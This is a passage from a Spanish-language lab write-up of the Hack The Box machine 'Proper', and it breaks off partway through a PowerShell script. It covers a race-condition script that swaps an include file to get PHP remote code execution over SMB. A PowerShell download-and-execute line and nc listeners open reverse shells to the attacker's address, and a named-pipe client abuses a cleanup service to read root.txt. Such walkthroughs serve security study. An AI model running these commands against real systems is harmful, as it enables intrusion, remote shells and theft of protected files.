+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321google_condicion_carrera_php.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>…</p>
+
+<p>Bien, ahora que sabemos que es un <code>race condition</code>, intentémoslo mediante un <code>script</code> que ejecutaremos después de lanzar la petición:</p>
+
+<blockquote>
+  <p>Voy a crear una carpeta llamada <code>header</code> en donde estará el archivo <code>header.inc</code> simplemente, así es más sencillo hacer todo :P</p>
+</blockquote>
+
+<p><strong>raceee.sh</strong>:</p>
+
+<pre><code class="language-bash">#!/bin/bash
+
+# Nos situamos donde este header.inc y lo regeneramos con contenido valido
+cd header/
+cat ../baksolarheader &gt; header.inc
+
+for i in {1..5000}; do
+    # Bucle sobre todos los archivos de la carpeta header/
+    for file in *; do
+        # Si el archivo existe y tenemos permisos de lectura...
+        if [[ -r $file ]]; then
+            # Borramos y generamos el nuevo header.inc pero con el contenido PHP, esto 5000 veces
+            rm -rf $file
+            cat ../ajatuque.php &gt; $file
+
+            # O mediante un link simbolico al archivo PHP
+            #ln -f -s ../ajatuque.php $file
+        fi
+    done
+done
+
+# Dejamos todo como estaba...
+rm -rf $file
+cat ../baksolarheader &gt; header.inc
+</code></pre>
+
+<p>Entonces el script sencillamente itera 5000 veces, donde cada una recorre los archivo de la carpeta <code>header/</code> (que solo tiene <code>header.inc</code>) y una vez tenemos el nombre del archivo (con <code>$file</code>, o sea que sería siempre igual a <code>header.inc</code>), lo borramos y copiamos el contenido del archivo <code>PHP</code> (con el código a inyectar) sobre uno llamado <code>header.inc</code> en la misma ruta…</p>
+
+<p>O también podríamos hacer el proceso, pero que en vez de copiar el contenido del <code>PHP</code> nos genere un link simbólico hacia él y una vez lea (llame/tome/etc) el archivo <code>header.inc</code> estaría leyendo realmente el contenido del archivo <code>PHP</code>. De cualquiera de las dos formas sirve, entonces probemos:</p>
+
+<p>En el archivo <code>PHP</code> vamos a simplemente agregar unas líneas que nos impriman un mensaje y nos ejecuten un comando en el sistema, así sabemos si esta siendo interpretado y si tenemos <code>RCE</code>, como ya vimos se llama <code>ajatuque.php</code>:</p>
+
+<pre><code class="language-php">&lt;?php 
+    echo "\nPuede ser fayt?\n"; 
+    $coma=shell_exec("whoami"); 
+    echo $coma; 
+?&gt;
+</code></pre>
+
+<p>Creamos de nuevo nuestra carpeta compartida por <code>SMB</code> pero ahora apuntando al directorio <code>/header</code>.</p>
+
+<pre><code class="language-bash">❭ python3 smbserver.py smbFolder $(pwd)/header -smb2support -username web -password "charlotte123!"
+</code></pre>
+
+<p>Estos dos pasos los tenemos que hacer casi simultáneos, solo debemos darle unos 2-3 segundos a la petición, para que se haga primero y tome el contenido <strong>válido</strong> del archivo <code>header.inc</code> (bypasseamos <code>strpos</code>) y ahí si ejecutamos el script para que modifique el contenido del <code>.inc</code>.</p>
+
+<p>Lanzamos petición:</p>
+
+<pre><code class="language-bash">❭ python3 licenses.py "\\\10.10.14.178\\smbFolder"
+</code></pre>
+
+<p>Esperamos 2 segundos y ejecutamos el script, vemos respuesta en nuestra carpeta <code>SMB</code> y como el resultado en la petición es:</p>
+
+<pre><code class="language-bash">❭ python3 licenses.py "\\\10.10.14.178\\smbFolder"
+
+[+] "Theme": \\10.10.14.178\smbFolder -&gt; ?theme=\\10.10.14.178\smbFolder&amp;h=9958fc71043a62ab691ff2a8f9e77b52
+
+Puede ser fayt?
+proper\web
+
+  &lt;body&gt;
+  ...
+...
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_race_condition_won_RCE.png" alt="321bash_race_condition_won_RCE" /></p>
+
+<p>Claro que siiiiiiiiiii, tenemos ejecución remota de comandos mediante un <code>race condition</code>…</p>
+
+<p><strong>¡Que lindura oiga!</strong></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321google_gif_wellLETSgo.gif" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Listos, pues ahora intentemos generar una Reverse Shell:</p>
+
+<p>Lo haremos mediante el archivo <code>Invoke-PowerShellTcp.ps1</code> del repo <a href="https://github.com/samratashok/nishang/tree/master/Shells">nishang</a>:</p>
+
+<p>Entonces, nos clonamos el repo (o solo el archivo, yo le cambié el nombre a <code>IpsTcp.ps1</code>), lo abrimos y nos copiamos (o movemos) esta línea:</p>
+
+<pre><code class="language-powershell">❭ cat IpsTcp.ps1
+...
+# Aprox linea 18
+PS &gt; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
+...
+</code></pre>
+
+<p>Nos vamos al final del archivo y la pegamos, pero cambiando la IP y el PUERTO donde queremos recibir la Reverse Shell, también le quitamos el <code>PS &gt;</code> del inicio:</p>
+
+<pre><code class="language-powershell">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.178 -Port 4433
+</code></pre>
+
+<p>Guardamos…</p>
+
+<p>Lo que haremos será indicarle mediante el <code>RCE</code> que haga una petición a este archivo, lo leerá, pero como al final tenemos una línea sin comentarios y dispuesta a ser ejecutada, hará eso, interpretara el archivo y se ejecutara esa línea, la cual hará la petición hacia esa dirección IP y el puerto, que es donde estaremos escuchando y nos devolverá una PowerShell :)</p>
+
+<p>Modificamos el comando en el archivo:</p>
+
+<pre><code class="language-php">&lt;?php 
+
+system("powershell -c \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.178:8000/IpsTcp.ps1')\"");
+
+?&gt;
+</code></pre>
+
+<ul>
+  <li>Levantamos el servidor web: <code>python3 -m http.server</code>.</li>
+  <li>Nos ponemos en escucha por el puerto <code>4433</code>: <code>rlwrap nc -lvp 4433</code>.</li>
+  <li>Ejecutamos petición al la carpeta compartida: <code>python3 licenses.py "\\\10.10.14.178\\smbFolder"</code>.</li>
+  <li>Esperamos 2-3 segundos y ejecutamos el script <code>raceee.sh</code>.</li>
+  <li>Yyyy:</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_webSH.png" alt="321bash_webSH" /></p>
+
+<p>Listos, tenemos una PowerShell como el usuario <code>web</code> dentro del sistema :) En este caso no podemos hacer tratamiento de…. ¿Qué no? JAAAAA! Dando vueltas encontramos un recurso que nos permite obtener una consola <strong>PowerShell</strong> Full TTY, en la que podemos hacer <strong>CTRL+C</strong>, tener histórico de comandos y movernos entre ellos:</p>
+
+<ul>
+  <li><a href="https://github.com/antonioCoco/ConPtyShell">https://github.com/antonioCoco/ConPtyShell</a>.</li>
+</ul>
+
+<p>Siguiendo los pasos del repo, nos indica el uso, descarguemos el archivo en la máquina para migrarnossss:</p>
+
+<pre><code class="language-powershell">PS C:\\Users\web\Videos&gt; certutil.exe -f -urlcache -split http://10.10.14.164:8000/Invoke-ConPtyShell.ps1 Invoke-ConPtyShell.ps1
+</code></pre>
+
+<p>En nuestra máquina atacante nos ponemos en escucha y vemos el tamaño de nuestra pantalla, esto lo usaremos ahorita:</p>
+
+<pre><code class="language-bash">❭ stty size
+43 192
+❭ nc -lvp 4434
+listening on [any] 4434 ...
+</code></pre>
+
+<p>Y ejecutamos en la máquina víctima la petición:</p>
+
+<pre><code class="language-powershell">PS C:\\Users\web\Videos&gt; IEX(Get-Content .\Invoke-ConPtyShell.ps1 -Raw); Invoke-ConPtyShell -RemoteIp 10.10.14.164 -RemotePort 4434 -Rows 43 -Cols 192
+</code></pre>
+
+<p>Recibimos la petición y ahora hacemos el tratamiento normal de la TTY:</p>
+
+<ul>
+  <li>Hacemos <code>CTRL + Z</code>.</li>
+  <li>Escribimos <code>stty raw -echo</code>.</li>
+  <li>Escribimos <code>fg</code> (aunque no se vea).</li>
+  <li>Damos <code>enter</code> y tamos full.</li>
+</ul>
+
+<hr />
+
+<pre><code class="language-bash">❭ nc -lvp 4434
+listening on [any] 4434 ...
+connect to [10.10.14.164] from proper.htb [10.10.10.231] 49336
+^Z
+[1]+  Detenido                nc -lvp 4434
+
+❭ stty raw -echo
+# Acá va el "fg"
+❭ nc -lvp 4434
+       # Damos enter y obtenemos...
+</code></pre>
+
+<pre><code class="language-powershell">Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\inetpub\wwwroot\licenses&gt;
+</code></pre>
+
+<p>Y tenemos una <code>PowerShell</code> totalmente interactivaaaaaaaaaaaaaaaaaaaaaaaaaaa. Podemos hacer <code>CTRL + C</code>, historial y movernos entre comandos. <span style="color: yellow;">QUÉ recursazo!!</span></p>
+
+<p>Ahora a enumerar…</p>
+
+<p>…</p>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h1>
+
+<p>Dando vueltas en la raíz encontramos este recurso llamativo:</p>
+
+<pre><code class="language-powershell">PS C:\Program Files&gt; dir
+
+    Directory: C:\Program Files
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       11/15/2020   4:05 AM                Cleanup
+...
+</code></pre>
+
+<p>Dentro tenemos:</p>
+
+<pre><code class="language-powershell">PS C:\Program Files\Cleanup&gt; dir
+
+    Directory: C:\Program Files\Cleanup
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       11/15/2020   4:03 AM        2999808 client.exe
+-a----       11/15/2020   9:22 AM            174 README.md
+-a----       11/15/2020   5:20 AM        3041792 server.exe
+
+</code></pre>
+
+<p>Interesante, ejecutandolos tenemos:</p>
+
+<pre><code class="language-powershell">PS C:\Program Files\Cleanup&gt; type README.md
+# Cleanup
+
+We find the garbage on your system and delete it!
+
+## Changelog
+
+- 31.10.2020 - Alpha Release
+
+## Todo
+
+- Create an awesome GUI
+- Check additional paths
+</code></pre>
+
+<pre><code class="language-powershell">PS C:\Program Files\Cleanup&gt; .\client.exe
+Cleaning C:\\Users\web\Downloads
+</code></pre>
+
+<p>Jmm esta borrando archivos de la ruta <code>C:\\Users\web\Downloads</code>:</p>
+
+<pre><code class="language-powershell">PS C:\Program Files\Cleanup&gt; ls -force c:\\Users\web\Downloads
+PS C:\Program Files\Cleanup&gt; 
+</code></pre>
+
+<p>Y viendo el servidor:</p>
+
+<pre><code class="language-powershell">PS C:\Program Files\Cleanup&gt; .\server.exe
+Error: open \\.\pipe\cleanupPipe: Access is denied.
+</code></pre>
+
+<p>Vale, error al abrir un pipe (entiendo que debe ser un <strong>named pipe</strong>) llamado <code>cleanupPipe</code>.</p>
+
+<blockquote>
+  <p>Un <strong>pipe</strong> es una sección de la memoria que los procesos pueden usar para comunicarse entre ellos.</p>
+</blockquote>
+
+<ul>
+  <li><a href="https://docs.microsoft.com/en-us/windows/win32/ipc/pipes">Microsoft Docs - Pipes</a>.</li>
+  <li><a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/named-pipe-client-impersonation">Named Pipes</a>.</li>
+</ul>
+
+<p>Si ponemos algún archivo en la ruta <code>C:\\Users\web\Downloads</code> y ejecutamos el binario <code>client.exe</code> no lo borra :(</p>
+
+<p>Aprovechemos la carpeta compartida que tenemos con <code>smbserver.py</code> y copiemos los binarios a nuestra máquina a ver si podemos obtener más info de ellos:</p>
+
+<pre><code class="language-powershell">PS C:\Program Files\Cleanup&gt; copy client.exe \\10.10.14.164\smbFolder\client.exe
+PS C:\Program Files\Cleanup&gt; copy server.exe \\10.10.14.164\smbFolder\server.exe
+</code></pre>
+
+<p>Y en nuestra máquina ya los tendriamos:</p>
+
+<pre><code class="language-bash">~/sec/htb/proper/content/files/cleanup ·
+❭ mv ../../../scripts/header/server.exe .
+❭ mv ../../../scripts/header/client.exe .
+❭ ls
+client.exe  server.exe
+</code></pre>
+
+<hr />
+
+<h2 id="cleanup-analysis">Hacemos análisis dinámico contra los binarios del proceso <u>Cleanup</u> <a href="#cleanup-analysis">📌</a></h2>
+
+<p>Validando si encontramos algo útil, alguna cadena interesante o leakeada, vemos:</p>
+
+<pre><code class="language-bash">❭ strings client.exe 
+...
+main.serviceClean
+main.serviceRestore
+main.clean
+main.restore
+main.main
+</code></pre>
+
+<p>(Validando el inicio de este output, vemos esto: <code>Go build ID: ...</code>. Es interesante porque podemos pensar desde ya que son binarios hechos en <code>Go</code>, pueda que sea necesario saberlo.)</p>
+
+<p>Tenemos lo que deben ser la funciones del programa, que el principal debe ser <code>main.main</code> y de ahí se van derivando las funcionalidades. Si nos fijamos esta la función (eso creemos) <code>cl, pero también hay una llamada </code>restore`, esto esta interesante… Pero ni idea como será el proceso para llegar a ella.</p>
+
+<p>Viendo el servidor:</p>
+
+<pre><code class="language-bash">❭ strings server.exe
+...
+main.encrypt
+main.decrypt
+main.handle
+main.clean
+main.restore
+main.createServer
+main.main
+</code></pre>
+
+<p>Jmmm cuenta con más funciones (seguimos creyendo :P), en este caso con dos llamativas, <code>encrypt</code> y <code>decrypt</code>, pero ni idea de su funcionamiento…</p>
+
+<p>En este punto podemos pensar en hacer algo de <strong>reversing</strong> a ver si logramos entender (o creer entender) que esta haciendo y si podemos aprovecharnos de algo. <strong>Pero antes de hacer esto</strong>, hagamos un análisis dinámico, o sea con los programas en ejecución a ver si logramos ver algo distinto. Tengo unos problemas con <code>wine</code>, así que lo mejor será movernos a una máquina virtual <strong>Windows</strong> para probar los binarios…</p>
+
+<p>Estando dentro e intentando ejecutar <code>cl, pero sin el servidor (</code>server.exe`) activo obtenemos el mismo output que antes, pero no se borra nada:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_trying_clean_files.png" alt="321win_trying_clean_files" /></p>
+
+<p>Si activamos el servidor (necesitas ejecutarlo con permisos de <strong>Administrador</strong>) y volvemos a intentar tenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_trying_clean_files_with_servON_fail.png" alt="321win_trying_clean_files_with_servON_fail" /></p>
+
+<p>Nada. No borra nada… Después de jugar un rato, agregando cualquier tipo de archivos, a mano, de internet, etc. Logramos al menos ver un output diferente después de varios intentos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_trying_clean_files_with_servON_done.png" alt="321win_trying_clean_files_with_servON_done" /></p>
+
+<p>Opa vemos que el output del cliente es el mismo, pero en el server obtenemos un <code>CLEAN &lt;path_file&gt;</code>.</p>
+
+<p>Bueno al menos tenemos algo distinto, pero es muy raro porque si volvemos a generar ese archivo (<code>.lnk</code>) o incluso otros, los borraba y obteníamos el output `CL, pero al intentarlo de nuevo (para tomar el screen de que algo pasaba :P) no los volvía a borrar :(</p>
+
+<p>Pero bueno, sabemos que si esta funcionando, raro, pero funcionando…</p>
+
+<p>Podríamos pensar que el <code>restore</code> debe ser como un “recuperar lo que se ha borrado” (creo que tiene lógica).</p>
+
+<p>Intentando de alguna forma ejecutar el <code>restore</code> con cosas como:</p>
+
+<ul>
+  <li>Borrar y ver si en algún momento se restauraba automáticamente.</li>
+  <li><code>client.exe MicrosoftEdge.lnk --restore</code>.</li>
+  <li>Otras cositas raras…</li>
+</ul>
+
+<p>Nada.</p>
+
+<p>Peeeeeeeeeeeeeeeeeeero si intentamos por ejemplo:</p>
+
+<ul>
+  <li><code>client.exe -R MicrosoftEdge.lnk</code>.</li>
+</ul>
+
+<p>Obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_trying_restore_files.png" alt="321win_trying_restore_files" /></p>
+
+<p>Opaaaaa obtenemos en el cliente el mensaje <code>Restoring &lt;file_name&gt;</code>, y el servidor hace un <code>open</code> al archivo que solicitamos, pero pasa el nombre a <code>base64</code> yyyyyyyy además lo esta buscando sobre la ruta <code>C:\ProgramData\Cleanup</code>… Interesantemente extraño.</p>
+
+<pre><code class="language-bash">❭ echo "MicrosoftEdge.lnk" | base64
+TWljcm9zb2Z0RWRnZS5sbmsK
+❭ echo "TWljcm9zb2Z0RWRnZS5sbms=" | base64 -d
+MicrosoftEdge.lnk
+❭ echo "TWljcm9zb2Z0RWRnZS5sbmsK" | base64 -d
+MicrosoftEdge.lnk
+</code></pre>
+
+<p>…</p>
+
+<p>Después probando con <code>Reversing</code> logramos ver la instrucción <code>-R</code> (en hex) esperando ser ejecutada, en este caso tuvimos suerte y dimos con la <code>R</code> sin necesitarlo, pero si no, pues esa parte estaría en el writeup 🤪 (pa que no quede taaaan largo)</p>
+
+<p>…</p>
+
+<h2 id="cleanup-pipe">Interactuamos con el <u>pipe</u> que usa <u>Cleanup</u> <a href="#cleanup-pipe">📌</a></h2>
+
+<p>En este punto estuve bastante perdido en el funcionamiento de lo que quería hacer. Si lo pensamos podemos intuir rápidamente que debemos/deberíamos intentar, pero el “como” fue lo que me estuvo quemando el cerebro (aunque al final es muuuuuuuuuuuuuuuuy sencillo):</p>
+
+<ul>
+  <li>Sabemos que borra un archivo y en el servidor llega <code>CLEAN</code> cuando lo hace.</li>
+  <li>Ese archivo lo quita de la ruta original y lo copia/mueve con un nombre en <strong>base64</strong> en la ruta <code>C:\ProgramData\Cleanup</code>.</li>
+  <li>Si queremos hacerle un <code>restore</code> al archivo, tenemos que pasarle el parámetro <code>-R</code> con el nombre del archivo borrado (ruta) en texto plano.</li>
+  <li>Tomara ese texto plano, generara la cadena en <strong>base64</strong> y la buscara en la ruta <code>C:\ProgramData\Cleanup</code>, si lo encuentra, lo regenera a la ruta de donde se borró…</li>
+  <li>Entonces podemos buscar alguna manera de indicarle al <code>pipe</code> <strong>cleanupPipe</strong> que borre (por ejemplo) el archivo <code>root.txt</code> (suponemos que esta en <code>C:\\Users\Administrator\Desktop</code>).</li>
+  <li>Aprovecharnos de que el archivo queda encriptado en la ruta <code>C:\ProgramData\Cleanup</code> y ver como podemos restaurarlo para ver su contenido…</li>
+</ul>
+
+<p>Entonces, si queremos “hablar” con el <code>pipe</code> podemos apoyarnos de <strong>PowerShell</strong>, buscando encontramos algunos recursos para guiarnos en nuestro script:</p>
+
+<ul>
+  <li><a href="https://stackoverflow.com/questions/31338421/asynchronous-named-pipes-in-powershell-using-callbacks">stackoverflow - Asynchronous named pipes in <strong>powershell</strong> using callbacks</a>.</li>
+  <li><a href="https://stackoverflow.com/questions/24096969/powershell-named-pipe-no-connection">stackoverflow - <strong>PowerShell</strong> Named Pipe: no connection?</a>.</li>
+  <li><a href="https://gbegerow.wordpress.com/tag/powershell-named-pipes/"><strong>PowerShell</strong> Named Pipes</a>.</li>
+  <li><strong>(Me falta un recurso que se me perdió (que casualidad 😠 :sad:), pero de ahí viene esta parte del writeup)</strong>.</li>
+</ul>
+
+<p><strong>Por si se quieren saltar esta parte en la que entendemos como interactúa el <code>pipe</code> con los servicios usando <code>IO Ninja</code> y, pero que también perdemos tiempo con un script, les hice un regalo:</strong></p>
+
+<p>⏳ <a href="#cleanup-ioninja">TEST - Usando <strong>IO Ninja</strong> para entender los procesos que hace el <strong>pipe</strong> (gracias <strong><u>4st1nus</u></strong>)</a>.<br />
+⌛ <a href="#cleanup-readfiles">DONE - Viendo el contenido de cualquier archivo del sistema</a>.</p>
+
+<p>…</p>
+
+<h2 id="cleanup-ioninja">Usando <u>IO Ninja</u> para ver procesos del <u>pipe</u> <a href="#cleanup-ioninja">📌</a></h2>
+
+<blockquote>
+  <p>De nuevo, gracias <u>4st1nus</u>.</p>
+</blockquote>
+
+<p>En el recurso perdido encontramos esta estructura guapetona:</p>
+
+<pre><code class="language-powershell">c:\Program Files\Cleanup&gt;type writer.ps1
+</code></pre>
+
+<pre><code class="language-powershell"># Define el nombre del pipe
+$PipeName = 'cleanupPipe'
+$PipeDir  = [System.IO.Pipes.PipeDirection]::Out
+$PipeOpt  = [System.IO.Pipes.PipeOptions]::Asynchronous
+
+# Acá almacena lo que se envia al pipe mediante un input por consola
+$Message = Read-Host "Put message to send to pipe"
+
+try {
+    # Crea la comunicación con el pipe
+    $pipeClient = new-object System.IO.Pipes.NamedPipeClientStream('.', $PipeName, $PipeDir, $PipeOpt)
+    # Crea el objeto que nos permite enviarle la data al pipe
+    $sw = new-object System.IO.StreamWriter($pipeClient)
+    $pipeClient.Connect()
+
+    if (!$pipeClient.IsConnected) {
+        throw "Failed to connect client to pipe $pipeName"
+    }
+
+    $sw.AutoFlush = $true
+    # Envia el "mensaje" al pipe
+    $sw.WriteLine($Message)
+}
+
+catch {
+    Write-Host "Error sending pipe message: $_" -ForegroundColor Red
+}
+
+finally {
+    # Entiendo que limpia las variables y cierra la conexion con el pipe
+    if ($sw) {
+        $sw.Dispose()
+        $sw = $null
+    }
+    if ($pipeClient) {
+        $pipeClient.Dispose()
+        $pipeClient = $null
+    }
+}
+</code></pre>
+
+<p>Entonces, la idea es que al ejecutarlo nos pedirá algo que será enviado al <strong>Pipe</strong>, le indicaremos <code>CLEAN C:\algo</code>, y esto llegara (<strong><em>ojalá</em></strong>) al servidor (<code>server.exe</code>) para ser procesado…</p>
+
+<p>Generemos un archivo para hacer las pruebas:</p>
+
+<pre><code class="language-powershell">c:\Program Files\Cleanup&gt;echo "a vel" &gt; C:\\Users\Varg\Desktop\aja.txt
+</code></pre>
+
+<p>Ejecutamos el script:</p>
+
+<pre><code class="language-powershell">PS c:\Program Files\Cleanup&gt; .\writer.ps1
+Put message to send to pipe: CLEAN C:\\Users\Varg\Desktop\aja.txt
+</code></pre>
+
+<p>Recibimos en el servidor un error:</p>
+
+<pre><code class="language-powershell">c:\Program Files\Cleanup&gt;server.exe
+CLEAN C:\\Users\Varg\Desktop\aja.txt
+: The filename, directory name, or volume label syntax is incorrect.
+</code></pre>
+
+<p>Lo cual es muy raro porque estamos colocando la ruta que es…</p>
+
+<p>ACÁ me perdí completamente, así que decidí pedir ayuda, ahí apareció <a href="https://twitter.com/4st1nus">4st1nus</a> (<strong>Gracias de nuevo</strong>).</p>
+
+<p>Me indico que me apoyara de la herramienta <a href="https://ioninja.com/">IO Ninja</a> para ver los procesos que hace el <strong>pipe</strong>, pero siguiendo la propia descripción de la web es:</p>
+
+<blockquote>
+  <p><strong>IO Ninja</strong> is a professional, scriptable, multi-purpose terminal emulator, sniffer, and protocol analyzer. It’s aimed at network security experts, system administrators, and all kinds of software/hardware/embedded developers.</p>
+</blockquote>
+
+<p>Después de descargarla, para cargar el programa lo hacemos así:</p>
+
+<ul>
+  <li><code>File</code> &gt; <code>New Session</code> &gt; <code>Pipe Monitor</code> &gt; En la parte de arriba hay un <strong>select</strong>, escogemos <code>File Name</code> y escribimos la ruta <code>C:\Program Files\Cleanup\client.exe</code> &gt; volvemos al <strong>select</strong> y seleccionamos <code>None</code> &gt; <code>Apply Filter</code> &gt; <code>Capture</code>.</li>
+  <li>(Hacemos lo mismo para el binario <code>server.exe</code>).</li>
+</ul>
+
+<p>Y procedemos a ejecutar de nuevo nuestro script, (probé otra cosa para saber que todo fuera oki y en donde encontramos algo extraño):</p>
+
+<pre><code class="language-powershell">PS c:\Program Files\Cleanup&gt; .\writer.ps1
+Put message to send to pipe: CLEAN hola
+</code></pre>
+
+<p>Y en el <strong>IO Ninja</strong> vemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_IO_cleanWithDots_fail.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Jmmm, algo extraño es que le agrega <strong>2 puntos</strong> al final de la búsqueda y ese tiene pinta de ser el problema…</p>
+
+<p>Después de un rato probando otras formas de jugar con el script, llegamos a una idea más pequeña:</p>
+
+<pre><code class="language-powershell">c:\Program Files\Cleanup&gt;type writer.ps1
+</code></pre>
+
+<pre><code class="language-powershell"># Nos conectamos al pipe
+$pipe = New-Object System.IO.Pipes.NamedPipeClientStream("cleanupPipe");
+$pipe.Connect(); 
+
+# Generamos objeto para interactuar con el pipe
+$sw = New-Object System.IO.StreamWriter($pipe);
+# Indicamos que borre el archivo que habiamos creado antes como prueba
+$sw.Write("CLEAN C:\\Users\Varg\Downloads\aja.txt");
+
+# Cerramos objetos
+$sw.Dispose(); 
+$pipe.Dispose();
+</code></pre>
+
+<p>Lo ejecutamos y obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_IO_cleanWithOutDots_fail.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Aparentemente va todo bien, pero en el servidor:</p>
+
+<pre><code class="language-powershell">c:\Program Files\Cleanup&gt;server.exe
+...
+CLEAN C:\\Users\Varg\Downloads\aja.tx
+open C:\\Users\Varg\Downloads\aja.tx: The system cannot find the file specified.
+</code></pre>
+
+<p>Ahora le quita una letraaaaaaaaaaaaaaaaaa 🤣, pero bueno, acá es más fácil, simplemente agreguémosle una al final de la cadena a ver si la interpreta bien:</p>
+
+<pre><code class="language-powershell">...
+$sw.Write("CLEAN C:\\Users\Varg\Downloads\aja.txt.");
+...
+</code></pre>
+
+<p>Y ahora obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_IO_cleanWithOutDots_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<pre><code class="language-powershell">c:\Program Files\Cleanup&gt;server.exe
+...
+CLEAN C:\\Users\Varg\Downloads\aja.txt
+</code></pre>
+
+<p>Perfecto, al menos no nos reporta errores, validando si el archivo se borró realmente tenemos:</p>
+
+<pre><code class="language-powershell">PS C:\Program Files\Cleanup&gt; ls C:\\Users\Varg\Downloads\
+PS C:\Program Files\Cleanup&gt; 
+</code></pre>
+
+<p>Listones, y también validemos que se haya generado el archivo encriptado en la ruta <code>C:\ProgramData\Cleanup</code>:</p>
+
+<pre><code class="language-powershell">PS C:\Program Files\Cleanup&gt; dir C:\ProgramData\Cleanup\
+
+    Directory: C:\ProgramData\Cleanup
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          4/9/2021  25:25 PM            120 QzpcVXNlcnNcVmFyZ1xEb3dubG9hZHNcYWphLnR4dA==
+
+PS C:\Program Files\Cleanup&gt; type C:\ProgramData\Cleanup\QzpcVXNlcnNcVmFyZ1xEb3dubG9hZHNcYWphLnR4dA==
+1d30bfee9a03a2c8e2c9adb66ce895cf5949e2d2406bf0ec66077fc4fe37f6aefd558f64a636570de0db530327936f35e73638155d8f0b56361cb600
+</code></pre>
+
+<p>Si decodeamos el nombre del archivo obtenemos <code>C:\\Users\Varg\Downloads\aja.txt</code>, así que perfecto, ahora hagamos el <strong>restore</strong> a ver como se procesa apoyándonos de <strong>IO Ninja</strong>:</p>
+
+<pre><code class="language-powershell">PS C:\Program Files\Cleanup&gt; .\client.exe -R C:\\Users\Varg\Downloads\aja.txt
+Restoring C:\\Users\Varg\Downloads\aja.txt
+PS C:\Program Files\Cleanup&gt; ls C:\ProgramData\Cleanup\
+PS C:\Program Files\Cleanup&gt; 
+</code></pre>
+
+<p>Oko, parece que sí, validemos el proceso y si lo dejo en su ruta <strong>nativa</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_IO_restorePath_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>OHH, el <strong>restore</strong> ya lo hace con la cadena decodeada, interesante (además de que tenemos <code>CLEANER</code> y <code>RESTORE</code> para usar en dado caso con nuestro script).</p>
+
+<pre><code class="language-powershell">PS C:\Program Files\Cleanup&gt; ls C:\\Users\Varg\Downloads\
+
+    Directory: C:\\Users\Varg\Downloads
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          4/9/2021  25:25 PM             16 aja.txt
+
+PS C:\Program Files\Cleanup&gt; type C:\\Users\Varg\Downloads\aja.txt
+a vel
+</code></pre>
+
+<p>…</p>
+
+<h2 id="cleanup-readfiles">Extraemos cualquier archivo del sistema <a href="#cleanup-readfiles">📌</a></h2>
+
+<p>Listoooooones, lo hace correctamente, tenemos un script funcional y sabemos como funciona <code>CLEANER</code> y <code>RESTORE</code>.</p>
+
+<p>Con esto en mente, ya podríamos ver el path para extraer archivos como <strong>Administrator</strong> y aprovecharnos de ellos para ver su contenido, si aún no lo ves, échale un poco de cabeza a ver como lo harías e.e</p>
+
+<p>Listo, ¿ya lo tienes? Entonces…</p>
+
+<p>Podemos aprovecharnos para extraer por ejemplo el archivo <code>root.txt</code> así:</p>
+
+<ol>
+  <li>Estando en la máquina víctima subimos nuestro script con la línea <code>$sw.Write("CLEAN C:\\Users\Administrator\Desktop\root.txt.");</code>.</li>
+  <li>Ejecutamos y veríamos en la ruta <code>C:\ProgramData\Cleanup\</code> el archivo encriptado.</li>
+  <li>Lo tomamos y nos lo pasamos a nuestra VM <strong>Windows</strong>.</li>
+  <li>Lo colocamos en la ruta <code>C:\ProgramData\Cleanup\</code>.</li>
+  <li>Aprovechamos el uso del <code>RESTORE</code>, le pasamos la ruta <code>C:\\Users\Administrator\Desktop\root.txt</code>, como hace la restauración en la ruta original, en teoría regeneraría el archivo en el directorio <code>C:\\Users\Administrator\Desktop\</code>.</li>
+</ol>
+
+<p>Démosle…</p>
+
+<p>Subimos script y ejecutamos, con esto generamos el <code>CLEAN</code> del archivo <code>root.txt</code>:</p>
+
+<pre><code class="language-powershell">PS C:\\Users\web\Videos&gt; .\certutil.exe -f -urlcache -split http://10.10.14.164:8000/writer.ps1 writer.ps1
+PS C:\\Users\web\Videos&gt; type .\writer.ps1
+</code></pre>
+
+<pre><code class="language-powershell"># Nos conectamos al pipe
+$pipe = New-Object System.IO.Pipes.NamedPipeClientStream("cleanupPipe");
+$pipe.Connect(); 
+
+# Generamos objeto para interactuar con el pipe
+$sw = New-Object System.IO.StreamWriter($pipe);
+# Indicamos que borre el archivo
